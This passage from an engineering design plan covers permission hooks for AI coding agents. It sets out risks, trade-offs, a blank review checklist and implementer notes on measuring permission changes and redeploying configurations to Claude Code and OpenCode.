| **OpenCode cannot express the carve-out at all**       | **Med**    | Step 1 probes before anything is written; ADR-0039 gives exactly two outcomes, the second being "drop from both" — steps 1–7 stand alone and carry most of the security win                                   |
| Two more files to keep in sync across agents           | High       | `permissions_test.go` parity + one-for-one header comments, same as the `task-redirect` pair                                                                                                                  |
| Shim adds a process per Bash call                      | Low        | Only for rtk opt-ins; noise against the existing five-hook chain — measure once in step 6                                                                                                                     |
| New `ask` entries create their own prompt fatigue      | Low        | Four entries, all on genuinely irreversible operations; measure prompt counts after a week                                                                                                                    |

### Trade-offs Made

- **Shim over `exclude_commands`:** keeps rtk's token savings, accepts coupling to
  rtk's output shape (ADR-0038).
- **`ask` floor stays in the list:** the classifier can only narrow prompts, never
  widen permissions, so a broken hook degrades to today's behavior (ADR-0039).
- **Positive proof over absence of a write signal:** the classifier allows only
  what it can read as literal text, so `gh api "repos/$O/$R/pulls/1"` — a genuine
  read — keeps prompting. Some of the measured win is given back for this, and it
  is not optional: this hook grants permission, so an evasion of it overrides the
  `ask` floor rather than merely missing a convenience (ADR-0039).
- **OpenCode rtk gap documented, not closed:** rtk owns its plugin file there and
  devgeta does not touch it. Stating the gap beats a fix that fights the tool —
  and §3's objective is scoped to match, rather than claiming coverage the cycle
  does not deliver.

---

## 8. Cross-Model Review Notes

- [ ] Domain context clear?
- [ ] Engineer context sufficient?
- [ ] Objective unambiguous?
- [ ] Scope actually locked?
- [ ] Steps actionable (5–15 min each, clear success criteria)?
- [ ] Verification executable?
- [ ] Risks realistic?

**Reviewer notes:**
(Fill in during review.)

---

## Notes for Implementers

- Every permission claim in this cycle was measured with a control, by the method
  in [agent-permission-matching.md §6](../../guides/agent-permission-matching.md#6-probing-this-yourself).
  Add a measurement the same way or do not add the claim.
- Step 1 gates the design, and steps 6 and 11 are the cycle. The tests protect
  the hooks; only those probes
  show the policy actually changed.
- Deploy to both agents after any config change:
  `dg configure claude --force` **and** `dg configure opencode --force`.
- Rebuild before deploying — `dg configure` extracts configs from the running
  binary, so a stale binary silently ships the old config (CLAUDE.md §12).
